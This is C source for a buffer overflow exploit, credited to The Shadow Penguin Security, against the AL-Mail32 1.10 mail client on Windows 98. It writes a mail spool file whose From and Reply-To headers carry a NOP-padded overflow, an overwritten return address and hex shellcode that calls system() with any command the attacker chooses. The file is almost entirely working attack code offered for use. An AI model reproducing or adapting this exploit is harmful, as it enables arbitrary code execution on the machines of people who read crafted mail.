/*=============================================================================
   AL-Mail32 Version 1.10 Exploit for Windows98
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/

#include    <stdio.h>
#include    <string.h>

#define HEADER1 \
"From hehehe@hohoho.com Sat Jul 32 25:01 JST 1999\n"\
"Message-ID: <001_The_ShadowPenguinSecurity_@rockhopper>\n"

#define HEADER2 \
"Content-Transfer-Encoding: 7bit\n"\
"X-Mailer: PenguinMailer Ver1.01\n"\
"Content-Type: text/plain; charset=US-ASCII\n"\
"Content-Length: 6\n"\
"\n"\
"hehe\n"

#define RETADR          260
#define JMPADR          256
#define JMPOFS          6
#define JMP_EBX_ADR     0xbff7a06b
#define CMDLENP         0x43
#define BUFEND          5000

#define FUNC            "msvcrt.dll.system.exit."

#define JMPS            0xeb
#define NOP             0x90

unsigned char exploit_code[200]={
 0xEB,0x4D,0x5B,0x53,0x32,0xE4,0x83,0xC3,0x0B,0x4B,0x88,0x23,0xB8,0x50,0x77,0xF7,
 0xBF,0xFF,0xD0,0x8B,0xD0,0x52,0x43,0x53,0x52,0x32,0xE4,0x83,0xC3,0x06,0x88,0x23,
 0xB8,0x27,0x6E,0xF7,0xBF,0x40,0xFF,0xD0,0x8B,0xF0,0x5A,0x43,0x53,0x52,0x32,0xE4,
 0x83,0xC3,0x04,0x88,0x23,0xB8,0x27,0x6E,0xF7,0xBF,0x40,0xFF,0xD0,0x8B,0xF8,0x43,
 0x53,0x83,0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,0xD6,0x33,0xC0,0x50,0xFF,0xD7,0xE8,
 0xAE,0xFF,0xFF,0xFF,0x00
};

main(int argc,char *argv[])
{
    FILE        *fp;
    static char buf[10000];
    int         i,r,ip;

    if (argc!=3){
        printf("usage : %s MailSpoolDirectry WindowsCommand\n",argv[0]);
        exit(1);
    }
    
    if ((fp=fopen(argv[1],"wb"))==NULL){
        printf("Permittion denied :-P\n");
        exit(1);
    }   
    fwrite(HEADER1,1,strlen(HEADER1),fp);

    memset(buf,NOP,BUFEND);
    strcat(exploit_code,FUNC);
    strcat(exploit_code,argv[2]);
    exploit_code[CMDLENP]=strlen(argv[2]);
    strncpy(buf+RETADR+4,exploit_code,strlen(exploit_code));

    ip=JMP_EBX_ADR;
    buf[JMPADR]  =0xeb;
    buf[JMPADR+1]=0x06;
    buf[RETADR+3]=0xff&(ip>>24);
    buf[RETADR+2]=0xff&(ip>>16);
    buf[RETADR+1]=0xff&(ip>>8);
    buf[RETADR]  =ip&0xff;
    buf[BUFEND]  =0;

    fprintf(fp,"Reply-To: \"%s\" <hehehe@hohoho.com>\n",buf);
    fprintf(fp,"From: \"%s\" <hehehe@hohoho.com>\n",buf);

    fwrite(HEADER2,1,strlen(HEADER2),fp);
    fclose(fp);
}

